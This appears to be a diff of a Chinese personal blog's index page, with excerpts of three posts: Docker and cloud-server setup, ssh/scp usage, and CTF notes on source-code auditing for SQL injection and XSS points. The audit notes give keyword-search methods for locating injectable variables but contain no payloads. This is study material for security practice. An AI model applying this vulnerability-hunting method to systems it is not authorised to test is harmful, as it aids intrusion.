-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/acwing%E6%90%AD%E5%BB%BA%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8Cdocker%E7%9A%84%E4%BD%BF%E7%94%A8/">
-                acwing搭建云服务器及docker的使用
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2022-07-15</span>
-            
-            
-                <a href="http://dezhoutorizhao.github.io/acwing%E6%90%AD%E5%BB%BA%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8Cdocker%E7%9A%84%E4%BD%BF%E7%94%A8/#disqus_thread" class="comments article-comment-link">留言</a>
-            
-            
-                <span class="category">
-                    <a href="/categories/linux/">linux</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <h1 id="搭建云服务器"><a href="#搭建云服务器" class="headerlink" title="搭建云服务器"></a>搭建云服务器</h1><h2 id="以下环境为Ubuntu20"><a href="#以下环境为Ubuntu20" class="headerlink" title="以下环境为Ubuntu20"></a>以下环境为Ubuntu20</h2><h2 id="云平台作用"><a href="#云平台作用" class="headerlink" title="云平台作用"></a>云平台作用</h2><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220714102552.png"></p>
-<h2 id="关系"><a href="#关系" class="headerlink" title="关系"></a>关系</h2><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220714103019.png"></p>
-<ol>
-<li>在租到的服务器上搭建docker类似于在服务器上又开了一台虚拟服务器，重新划分了一下服务器的房子</li>
-<li>docker的搭建原因：docker有很强的迁移性，例如从阿里云的服务器迁移到腾讯云时，使用docker可以很容易地迁移</li>
-<li>docker是非常独立的：可以在一个服务器上开任意多个docker</li>
-<li>未来的开发环境是在docker所在的第三层</li>
-<li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220714104459.png"></li>
-</ol>
-<h2 id="选择配置问题"><a href="#选择配置问题" class="headerlink" title="选择配置问题"></a>选择配置问题</h2><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220714104646.png"></p>
-<h2 id="常规搭建步骤"><a href="#常规搭建步骤" class="headerlink" title="常规搭建步骤"></a>常规搭建步骤</h2><ol>
-<li>配置以下本地的 <strong>~/.ssh/config</strong>文件，可以实现不用username@hostname，使用别名机制登录</li>
-<li>配置一下免密登录<pre class="line-numbers language-none"><code class="language-none">## 免密登录
+选择配置问题
+常规搭建步骤
+配置以下本地的 ~/.ssh/config文件，可以实现不用username@hostname，使用别名机制登录
+配置一下免密登录## 免密登录
 1. 在本地（本子上），**ssh-keygen**，会在.ssh&#x2F;文件夹下生成密钥：id_rsa和公钥id_rsa.pub
 2. 之后想要免密登录哪个服务器，就将本地的公钥传给哪个服务器即可
 3. 在服务器中的.ssh&#x2F;路径下创建一个 **authorized_keys** 文件，然后将本地生成的密钥复制到这个文件中，如果原本就有这个文件，那么只需要在后面加上密钥即可
-4. 例如，想要免密登录myserver服务器，就将公钥中的内容，复制到myserver中的~&#x2F;.ssh&#x2F;authorized_keys文件里即可
-5. 也可以使用**ssh-copy-id myserver**一键添加公钥
-6. 公钥添加到.ssh&#x2F;authorized_keys中即可免密登录
-7. 误区：在服务器上的生成了密钥，传到了服务器本身的authorized_keys或者主机上的，**不能自己登自己**
-8. 可以将自己的密钥传递给多个服务器，当服务器很多时，可以实现只需服务器名字登陆![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20220714164253.png)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-<li>配置一下tmux和vim，将本地的.vimrc和.tmux.conf文件传到服务器的根目录下<pre class="line-numbers language-none"><code class="language-none">scp .vimrc .tmux.conf myserver:<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-</ol>
-<h2 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h2><ol>
-<li>登录docker官网，一步一步来就行</li>
-<li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220715171552.png"></li>
-</ol>
-<h2 id="配置docker"><a href="#配置docker" class="headerlink" title="配置docker"></a>配置docker</h2><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;docs.docker.com&#x2F;engine&#x2F;install&#x2F;ubuntu&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h3 id="将当前用户添加到docker用户组"><a href="#将当前用户添加到docker用户组" class="headerlink" title="将当前用户添加到docker用户组"></a>将当前用户添加到docker用户组</h3><ol>
-<li>为了避免每一次使用docker都要加上sudo权限，可以将当前用户加入安装中自动创建的docker用户组<pre class="line-numbers language-none"><code class="language-none">sudo usermod -aG docker $USER<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-</ol>
-<h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><ol>
-<li>镜像：<strong>image</strong> ，相当于一个模板，每一个镜像都可以生成一堆容器，<strong>container</strong></li>
-<li>每个image的名称：xxxx：xxxx,冒号前面为名称，冒号后面为tag,即版本号</li>
-</ol>
-<h3 id="镜像"><a href="#镜像" class="headerlink" title="镜像"></a>镜像</h3><ol>
-<li>拉取（从docker Hub中<strong>下载</strong>一个镜像）一个镜像,此处以拉取20版ubuntu为例，镜像名称:镜像版本<pre class="line-numbers language-none"><code class="language-none">docker pull ubuntu:20.04<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-<li>列出本地所有镜像<pre class="line-numbers language-none"><code class="language-none">docker images<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-<li>删除某个镜像，此处以ubuntu:20为例<pre class="line-numbers language-none"><code class="language-none">docker image rm ubuntu:20.04 或者 docker rmi ubuntu:20.04<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-<li>创建某个container的镜像<pre class="line-numbers language-none"><code class="language-none">docker [container] commit CONTAINER IMAGE_NAME:TAG<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-<li>将镜像ubuntu:20.04导出到本地ubuntu_20_04.tar中（以另一种文件格式保存）<pre class="line-numbers language-none"><code class="language-none">docker save -o ubuntu_20_04.tar ubuntu:20.04<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-<li>将镜像ubuntu:20.04从本地文件ubuntu_20_04.tar中加载出来<pre class="line-numbers language-none"><code class="language-none">docker load -i ubuntu_20_04.tar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-</ol>
-<h3 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h3><ol>
-<li>利用镜像创建一个容器,create -it<pre class="line-numbers language-none"><code class="language-none">docker [container] create -it ubuntu:20.04<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-<li>查看本地所有的容器,所有创建了的容器，不只是启动了的就加[-a]参数，如果不加-a参数的话就是默认正在启动的容器<pre class="line-numbers language-none"><code class="language-none">docker ps [-a]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-<li>启动容器,start<pre class="line-numbers language-none"><code class="language-none">docker [container] start CONTAINER<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-<li>停止容器,stop<pre class="line-numbers language-none"><code class="language-none">docker stop CONTAINER<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-<li>重启容器,restart<pre class="line-numbers language-none"><code class="language-none">docker restart CONTAINER<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-<li>创建并启动一个容器,加-d不进入,不加-d就是创建并进入容器,run,-it<pre class="line-numbers language-none"><code class="language-none">docker run -itd ubuntu:20.04<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-<li>进入容器,先按ctrl+p,再按ctrl+q可以挂起容器<pre class="line-numbers language-none"><code class="language-none">docker attach container<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-<li>在容器中执行命令,exec<pre class="line-numbers language-none"><code class="language-none">docker exec container command<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-<li>删除容器，rm<pre class="line-numbers language-none"><code class="language-none">docker rm container<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-<li>删除所有已经停止的容器，prune<pre class="line-numbers language-none"><code class="language-none">docker container prune<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-<li>将容器container导出到本地文件xxx.rar中,export<pre class="line-numbers language-none"><code class="language-none">docker export -o xxx.rar container<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-<li>将本地文件xxx.tar导出为镜像，并且将镜像命名为image_name:tag,import,从本地导向容器是import,从容器导向本地是export,进出关系<pre class="line-numbers language-none"><code class="language-none">docker import xxx.tar image_name:tag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-<li>docker export/import 与docker save/load的区别<pre class="line-numbers language-none"><code class="language-none">export&#x2F;import 会丢弃记录和元数据信息，仅仅保存容器当时的快照信息，例如容器的名字就不会保留
-save&#x2F;load 会保留完整记录，体积更大<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
-<li>查看某个容器的所有进程,top<pre class="line-numbers language-none"><code class="language-none">docker top container<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-<li>查看所有容器的统计信息，包括CPU，内存，存储，网络等信息,stats<pre class="line-numbers language-none"><code class="language-none">docker stats<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-<li>在本地和容器之间复制文件,还是和cp和scp的格式一样,先source后destination，先从后到,cp<pre class="line-numbers language-none"><code class="language-none">docker cp xxx container:xxx
-docker cp container:xxx xxx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
-<li>重命名容器,rename<pre class="line-numbers language-none"><code class="language-none">docker rename container1 container2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-<li>修改容器限制,update<pre class="line-numbers language-none"><code class="language-none">docker update container --memory 500MB<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-</ol>
-<h3 id="容器和镜像的区别"><a href="#容器和镜像的区别" class="headerlink" title="容器和镜像的区别"></a>容器和镜像的区别</h3><ol>
-<li>docker的生命周期：镜像image+容器container+仓库registry,容器是由镜像实例化而来</li>
-<li>容器即为进程，是镜像的实例，是运行环境包的实例，可以针对这个环境包运行N个实例，即容器是镜像的一种具体表现形式</li>
-<li>镜像即为文件，想象为一个盖章，可以盖到任意的docker平台中去运行</li>
-<li>容器是基于镜像所创建的，容器中的进程依赖于镜像中的文件</li>
-<li>docker就是一个mini版本的Linux系统，拥有完全与宿主机隔离的系统文件，进程，用户权限，网络空间等</li>
-<li>镜像和容器的先后顺序：现有镜像后由实例的容器，虽然创建镜像可以参考某个容器，但是标准的做法是先制作镜像后跑容器</li>
-</ol>
-<h2 id="docker入门概念"><a href="#docker入门概念" class="headerlink" title="docker入门概念"></a>docker入门概念</h2><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220722155932.png"></p>
-<ol>
-<li>开发和运维工程师的结合，更快的交付<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220722160245.png"><br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220722160743.png"><br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220722163027.png"><br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220722164155.png"></li>
-</ol>
-<h2 id="docker和docker-hub的关系"><a href="#docker和docker-hub的关系" class="headerlink" title="docker和docker hub的关系"></a>docker和docker hub的关系</h2><ol>
-<li>docker是官网</li>
-<li>docker hub是安装docker镜像的仓库<h3 id="dockerfile-image-container-repository"><a href="#dockerfile-image-container-repository" class="headerlink" title="dockerfile image container repository"></a>dockerfile image container repository</h3></li>
-<li>通过dockerfile可以生成docker image</li>
-<li>自己制作的镜像可以上传到docker hub平台，也可以从平台上拉去我们所需要的镜像</li>
-<li>当镜像拉取到本地后，我们可以实例化这个镜像，形成一个container(实例)了<pre class="line-numbers language-none"><code class="language-none">docker run [组织名称]&#x2F;&lt;镜像名称&gt;：[镜像标签]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-</ol>
-<h3 id="dockerfile"><a href="#dockerfile" class="headerlink" title="dockerfile"></a>dockerfile</h3><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><ol>
-<li><p>Dockerfile 是 Docker 比较重要的概念。它是 Docker 创建镜像的核心，它的出现给 Docker 提供了两大好处：</p>
-</li>
-<li><p>文本化的镜像生成操作让其方便版本管理和自动化部署</p>
-</li>
-<li><p>每条命令对应镜像的一层，细化操作后保证其可增量更新，复用镜像块，减小镜像体积</p>
-</li>
-</ol>
-<h4 id="dockerfile的编写规则"><a href="#dockerfile的编写规则" class="headerlink" title="dockerfile的编写规则"></a>dockerfile的编写规则</h4><ol>
-<li>使用#来注释</li>
-<li>from指令告诉docker使用哪个镜像作为基础</li>
-<li>run开头的指令会在创建中运行，比如安装一个软件包</li>
-<li>copy指令将文件复制到镜像中</li>
-<li>workdir指定工作目录</li>
-<li>cmd/entrypoint 镜像启动执行命令</li>
-<li>最后执行以下命令即可完成docker镜像的创建<pre class="line-numbers language-none"><code class="language-none">docker build lizheming&#x2F;drone-wechat:latest<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-</ol>
+4. 例如，想要免密登录myserve ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/ssh%E4%BD%BF%E7%94%A8%E5%8F%8A%E5%85%8D%E5%AF%86%E7%99%BB%E5%BD%95/" title="ssh">ssh</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2022-07-14T09:02:48.654Z" title="发表于 2022-07-14 17:02:48">2022-07-14</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/linux/">linux</a></span></div><div class="content">ssh远程登录原理
+安全，即使被截获也没毛病
 
-        </div>
-    
 
-</div>
-            
-                
-<div class="post">
+远程登录服务器语法
+ssh user@hostname
+user:用户名
+hostname:IP地址或域名
 
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/ssh%E4%BD%BF%E7%94%A8%E5%8F%8A%E5%85%8D%E5%AF%86%E7%99%BB%E5%BD%95/">
-                ssh
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2022-07-14</span>
-            
-            
-                <a href="http://dezhoutorizhao.github.io/ssh%E4%BD%BF%E7%94%A8%E5%8F%8A%E5%85%8D%E5%AF%86%E7%99%BB%E5%BD%95/#disqus_thread" class="comments article-comment-link">留言</a>
-            
-            
-                <span class="category">
-                    <a href="/categories/linux/">linux</a>
-                </span>
-            
-        </div>
-    </div>
+初次登录会提示
+初次登录会提示
+登录后服务器的信息会记录在~/.ssh/known_hosts文件夹中
+然后输入密码即可登录到服务器中
+默认登录端口为22，如果想要登录某一特定端口，加上 -p 参数
+假设想要登录23号端口：ssh username@hostname -p 23
 
-    
-        <div class="content">
-            <h1 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h1><h2 id="远程登录原理"><a href="#远程登录原理" class="headerlink" title="远程登录原理"></a>远程登录原理</h2><ol>
-<li>安全，即使被截获也没毛病</li>
-<li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220714113940.png"></li>
-</ol>
-<h2 id="远程登录服务器语法"><a href="#远程登录服务器语法" class="headerlink" title="远程登录服务器语法"></a>远程登录服务器语法</h2><ol>
-<li>ssh user@hostname</li>
-<li>user:用户名</li>
-<li>hostname:IP地址或域名</li>
-</ol>
-<h3 id="初次登录会提示"><a href="#初次登录会提示" class="headerlink" title="初次登录会提示"></a>初次登录会提示</h3><ol>
-<li>初次登录会提示<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220714110814.png"></li>
-<li>登录后服务器的信息会记录在~/.ssh/known_hosts文件夹中</li>
-<li>然后输入密码即可登录到服务器中</li>
-<li>默认登录端口为22，如果想要登录某一特定端口，加上 <strong>-p</strong> 参数</li>
-<li>假设想要登录23号端口：ssh username@hostname -p 23</li>
-</ol>
-<h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><ol>
-<li>在客户端中（主机，本子）中创建文件 ~/.ssh/config   <strong>config文件就是用来创建别名机制的</strong></li>
-<li>在文件中输入<pre class="line-numbers language-none"><code class="language-none">Host myserver1
+配置文件
+在客户端中（主机，本子）中创建文件 ~/.ssh/config   config文件就是用来创建别名机制的
+在文件中输入Host myserver1
     HostName IP地址或域名
     User 用户名
 
 Host myserver2
     HostName IP地址或域名
-    User 用户名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-<li>之后再使用服务器时，可以直接使用别名myserver1 和 myserver2</li>
-</ol>
-<h2 id="免密登录"><a href="#免密登录" class="headerlink" title="免密登录"></a>免密登录</h2><ol>
-<li>在本地（本子上），<strong>ssh-keygen</strong>，会在.ssh/文件夹下生成密钥：id_rsa和公钥id_rsa.pub</li>
-<li>之后想要免密登录哪个服务器，就将本地的公钥传给哪个服务器即可</li>
-<li>在服务器中的.ssh/路径下创建一个 <strong>authorized_keys</strong> 文件，然后将本地生成的密钥复制到这个文件中，如果原本就有这个文件，那么只需要在后面加上密钥即可</li>
-<li>例如，想要免密登录myserver服务器，就将公钥中的内容，复制到myserver中的~/.ssh/authorized_keys文件里即可</li>
-<li>也可以使用<strong>ssh-copy-id myserver</strong>一键添加公钥</li>
-<li>公钥添加到.ssh/authorized_keys中即可免密登录</li>
-<li>误区：在服务器上的生成了密钥，传到了服务器本身的authorized_keys或者主机上的，<strong>不能自己登自己</strong></li>
-<li>可以将自己的密钥传递给多个服务器，当服务器很多时，可以实现只需服务器名字登陆<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220714164253.png"></li>
-</ol>
-<h2 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h2><h3 id="为什么"><a href="#为什么" class="headerlink" title="为什么"></a>为什么</h3><ol>
-<li>当我们需要自动化运维时，需要实现一步：<strong>登进去，执行一个命令之后，退出来</strong></li>
-<li>当有大量服务器时，如果登进去，实现一个命令之后，再退出来就会消耗大量的人力时间</li>
-</ol>
-<h3 id="怎么做"><a href="#怎么做" class="headerlink" title="怎么做"></a>怎么做</h3><h4 id="命令格式"><a href="#命令格式" class="headerlink" title="命令格式"></a>命令格式</h4><ol>
-<li>在<strong>ssh登录之后</strong>直接<strong>加上命令</strong><pre class="line-numbers language-none"><code class="language-none">ssh user@hostname command<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220714165333.png"></li>
-<li>这个命令的执行是在服务器中实现的，结果重定向到本地</li>
-<li>注意：单引号中的$i可以求值<pre class="line-numbers language-none"><code class="language-none">ssh myserver &#39;for ((i &#x3D; 0; i &lt; 10; i ++ )) do echo $i; done&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-<li>双引号中的$i不可以求值<pre class="line-numbers language-none"><code class="language-none">ssh myserver &quot;for ((i &#x3D; 0; i &lt; 10; i ++ )) do echo $i; done&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-</ol>
-<h2 id="scp传文件"><a href="#scp传文件" class="headerlink" title="scp传文件"></a>scp传文件</h2><h3 id="命令格式-可以记成ssh的cp-scp"><a href="#命令格式-可以记成ssh的cp-scp" class="headerlink" title="命令格式(可以记成ssh的cp,scp)"></a>命令格式(可以记成ssh的cp,scp)</h3><ol>
-<li>scp source destination</li>
-<li>将source路径下的文件复制到destination中，先从后到，和cp命令一样<h4 id="一次复制多个文件"><a href="#一次复制多个文件" class="headerlink" title="一次复制多个文件"></a>一次复制多个文件</h4></li>
-<li>scp source1 source2 destination</li>
-</ol>
-<h4 id="复制文件夹"><a href="#复制文件夹" class="headerlink" title="复制文件夹"></a>复制文件夹</h4><ol>
-<li>scp -r ~/tmp myserver:/home/acs  -r放在source和destination的前面</li>
-<li>服务器和本地的地址都可以作为source或者destination,即既可以将文件从本地传到服务器上，也可以从服务器上传到本地</li>
-<li>本地文件使用相对路径或绝对路径都可以</li>
-<li>服务器上的路径：服务器的地址或别名:地址（这个地址可以写绝对路径，也可以写相对于根目录的相对地址，<strong>不写的话默认为根目录</strong>）</li>
-</ol>
-<h4 id="指定服务器的端口号"><a href="#指定服务器的端口号" class="headerlink" title="指定服务器的端口号"></a>指定服务器的端口号</h4><pre class="line-numbers language-none"><code class="language-none">scp -P source1 source2 destination<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<ol>
-<li>注意，这个地方的-P是大写的，ssh的-p是小写的</li>
-<li>scp的-r和-P参数尽量加在source和destination之前</li>
-</ol>
-<h4 id="服务器之间传"><a href="#服务器之间传" class="headerlink" title="服务器之间传"></a>服务器之间传</h4><ol>
-<li>scp命令不止限于主机和服务器之间传文件，也可以在两台服务器之间传文件，即source和destination都可以为服务器的路径</li>
-<li>但是必须两台服务器之间的授权非常完整，否则会报错</li>
-<li>所以可以将一台服务器上的文件传到本地，再由本地传到另一台服务器上<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220715104640.png"></li>
-</ol>
-<h3 id="使用scp配置其它服务器的vim和tmux"><a href="#使用scp配置其它服务器的vim和tmux" class="headerlink" title="使用scp配置其它服务器的vim和tmux"></a>使用scp配置其它服务器的vim和tmux</h3><ol>
-<li>vim的配置文件:  .vimrc</li>
-<li>tmux的配置文件：  .tmux.conf</li>
-<li>配置vim和tmux只需要将vim和tmux的配置文件传到服务器的根目录下即可<pre class="line-numbers language-none"><code class="language-none">scp .vimrc .tmux.conf myserver:<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-</ol>
+    User 用户名
+之后再使用服务器时，可以直接使用别名myserver1 和 myserver2
 
-        </div>
-    
+免密登录
+在本地（本子上），ssh-keygen，会在.ssh/文件夹下生成密钥：id_rsa和公钥id_rsa.pub
+之后想要免密登录哪个服务器 ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/%E5%B0%8F%E8%BF%AA%E8%80%81%E5%B8%88%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="小迪老师代码审计">小迪老师代码审计</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2022-07-13T10:03:57.216Z" title="发表于 2022-07-13 18:03:57">2022-07-13</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/CTF/">CTF</a></span></div><div class="content">代码审计挖掘漏洞
+关键字搜索：1搜变量，2搜函数关键字
 
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/%E5%B0%8F%E8%BF%AA%E8%80%81%E5%B8%88%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
-                小迪老师代码审计
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2022-07-13</span>
-            
-            
-                <a href="http://dezhoutorizhao.github.io/%E5%B0%8F%E8%BF%AA%E8%80%81%E5%B8%88%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/#disqus_thread" class="comments article-comment-link">留言</a>
-            
-            
-                <span class="category">
-                    <a href="/categories/CTF/">CTF</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><h2 id="挖掘漏洞"><a href="#挖掘漏洞" class="headerlink" title="挖掘漏洞"></a>挖掘漏洞</h2><ol>
-<li>关键字搜索：1搜变量，2搜函数关键字</li>
-</ol>
-<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><ol>
-<li>fortify，批量化挖掘漏洞，静态挖掘漏洞，支持多种语言，做题先扫描一遍<h3 id="seay："><a href="#seay：" class="headerlink" title="seay："></a>seay：</h3></li>
-<li>扫描关键字<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220713002441.png">,</li>
-<li>输入关键字之后点击全局搜索，</li>
-<li>但是可能封装到一个类中了，</li>
-<li>记住勾选正则和不区分大小写，</li>
-<li>一定要看看哪一个语句是否有变量，没有变量就是写死了，没有办法控制变量，就没办法<strong>sql注入</strong>，</li>
-<li><strong>乱码记得切换编码</strong></li>
-<li>由关键字搜索到具体函数，根据函数名右键全局搜索调用函数的位置<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220713003157.png"></li>
-<li>关键字搜索，使用全局搜索,搜索可控变量或者执行函数</li>
-<li>搜索例如select update insert 等sql语句函数，看看是否有可控变量，没有可控变量就是死sql语句，无法进行sql注入</li>
-<li>函数查询</li>
-<li>找到具体函数之后，右键定位函数使用的位置<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220713003157.png"></li>
-<li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220713003157.png"></li>
-</ol>
-<h4 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h4><ol>
-<li>搜索select</li>
-<li>找到变量</li>
-<li>找到变量调用函数</li>
-<li>右键定位函数调用位置</li>
-<li>看看页面和数据库的互动，根据回显判断注入点</li>
-</ol>
-<h4 id="判断过滤机制"><a href="#判断过滤机制" class="headerlink" title="判断过滤机制"></a>判断过滤机制</h4><ol>
-<li>看配置文件，看配置文件的关键字，例如：fun、inc</li>
-</ol>
-<h2 id="漏洞产生的根本"><a href="#漏洞产生的根本" class="headerlink" title="漏洞产生的根本"></a>漏洞产生的根本</h2><ol>
-<li>可控变量</li>
-<li>特定函数，决定漏洞类型</li>
-<li>不存在过滤或过滤不严谨存在绕过导致的安全漏洞</li>
-</ol>
-<h2 id="定点挖掘关键字"><a href="#定点挖掘关键字" class="headerlink" title="定点挖掘关键字"></a>定点挖掘关键字</h2><h4 id="可控变量"><a href="#可控变量" class="headerlink" title="可控变量"></a>可控变量</h4><ol>
-<li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712235655.png"></li>
-<li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712235708.png"></li>
-<li>接受来的id参数将会传递给sql语句执行<h5 id="变量的接受"><a href="#变量的接受" class="headerlink" title="变量的接受"></a>变量的接受</h5></li>
-<li>变量的接受方式：get post</li>
-<li>接受关键字：$_GET $_POST</li>
-</ol>
-<h4 id="特定函数"><a href="#特定函数" class="headerlink" title="特定函数"></a>特定函数</h4><h5 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h5><ol>
-<li>print echo<h5 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h5><h4 id="搜索特定关键字尝试寻找特定漏洞"><a href="#搜索特定关键字尝试寻找特定漏洞" class="headerlink" title="搜索特定关键字尝试寻找特定漏洞"></a>搜索特定关键字尝试寻找特定漏洞</h4></li>
-<li>搜索echo print 尝试挖掘的就是xss漏洞</li>
-<li>搜索$_GET $_POST 尝试挖掘的就是安全漏洞（可控变量）</li>
-<li>搜索select insert update sql执行语句 == sql注入漏洞</li>
-</ol>
-<h2 id="定点挖掘功能点"><a href="#定点挖掘功能点" class="headerlink" title="定点挖掘功能点"></a>定点挖掘功能点</h2><ol>
-<li>我要挖掘文件上传，通过网站的浏览，发现文件上传的位置，例如会员中心，<strong>抓包分析</strong>找到源码中的特定文件代码段，进行文件上传代码分析挖掘。</li>
-</ol>
-<h2 id="拓展：视漏洞而定"><a href="#拓展：视漏洞而定" class="headerlink" title="拓展：视漏洞而定"></a>拓展：视漏洞而定</h2><ol>
-<li>sql注入 数据库监控-监控到当前页面和数据库的交互过程（SQL执行语句）</li>
-<li>断点调试：访问页面时对应代码进行断点调试（执行过程前后顺序，调用文件列表）</li>
-</ol>
-
-        </div>
-    
-
-</div>
-            
-        </section>
-    </div>
-</div>
+工具
+fortify，批量化挖掘漏洞，静态挖掘漏洞，支持多种语言，做题先扫描一遍seay：
+扫描关键字,
+输入关键字之后点击全局搜索，
+但是可能封装到一个类中了，
+记住勾选正则和不区分大小写，
+一定要看看哪一个语句是否有变量，没有变量就是写死了，没有办法控制变量，就没办法sql注入，
+乱码记得切换编码
+由关键字搜索到具体函数，根据函数名右键全局搜索调用函数的位置
+关键字搜索，使用全局搜索,搜索可控变量或者执行函数
+搜索例如select update insert 等sql语句函数，看看是否有可控变量，没有可控变量就是死sql语句，无法进行sql注入
+函数查询
+找到具体函数之后，右键定位函数使用的位置
 
 
+步骤
+搜索select
+找到变量
+找到变量调用函数
+右键定位函数调用位置
+看看页面和数据库的互动，根据回显判断注入点
 
-    <div class="row">
-        <div class="col-sm-12">
-            <div class="wrap-pagination">
-                <a class="" href="/page/5/">
-                    <i class="fa fa-chevron-left" aria-hidden="true"></i>
-                </a>
-                <a class="" href="/page/7/">
-                    <i class="fa fa-chevron-right" aria-hidden="true"></i>
-                </a>
+判断过滤机制
+看配置文件，看配置文件的关键字，例如：fun、inc
+
+漏洞产生的根本
+可控变量
+特定函数，决定漏洞类型
+不存在过滤或过滤不严谨存在绕过导致的安全漏洞
+
+定点挖掘关键字可控变量
+
+
